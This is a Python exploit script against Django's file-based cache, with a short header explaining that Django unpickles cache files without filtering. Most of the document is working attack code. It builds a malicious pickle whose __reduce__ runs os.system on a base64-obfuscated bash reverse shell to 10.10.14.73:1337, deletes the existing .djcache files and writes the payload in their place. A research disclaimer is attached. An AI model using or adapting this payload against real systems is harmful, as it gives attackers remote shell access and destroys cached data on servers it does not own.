"""
------------------------------------------------------------------------
Django RCE Pickle Code Injection Vulnerability
------------------------------------------------------------------------

[-] Vulnerabilities Description:

 Django reads the contents of the cached file directly with loads without any filtering. This means that we can construct any malicious serialized content to control the content returned by Django, or even RCE, and as long as we know the name and location where the cache is stored, then we will be able to execute the code directly.

This python script generate a cache, generate a pickle serialized Payload, then write the encoded RCE to the existing cache.

[-] License MIT

Created by mdn0x

[-] Disclaimer !!!

The contents of this file are exclusively for research and learning purposes.

"""

import pickle
import base64
import os
import time

# ---- Setting the Reverse Shell ----

cache_dir = "/var/tmp/django_cache"
cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzMvMTMzNyAwPiYxKSAm | base64 -d | bash"

# ---- Generate Pickle payload ----

class RCE:
    def __reduce__(self):
        return (os.system, (cmd,),)

payload = pickle.dumps(RCE())


# ---- Write Cache Files ----

for filename in os.listdir(cache_dir):
    if filename.endswith(".djcache"):  
        path = os.path.join(cache_dir, filename)  
        try:  
            os.remove(path)  # Delete the original file  
        except:  
            continue  
        with open(path, "wb") as f:  
            f.write(payload) # Write Payload
        print(f"[+] Written payload to {filename}")		
        print("Created by mdn0x")


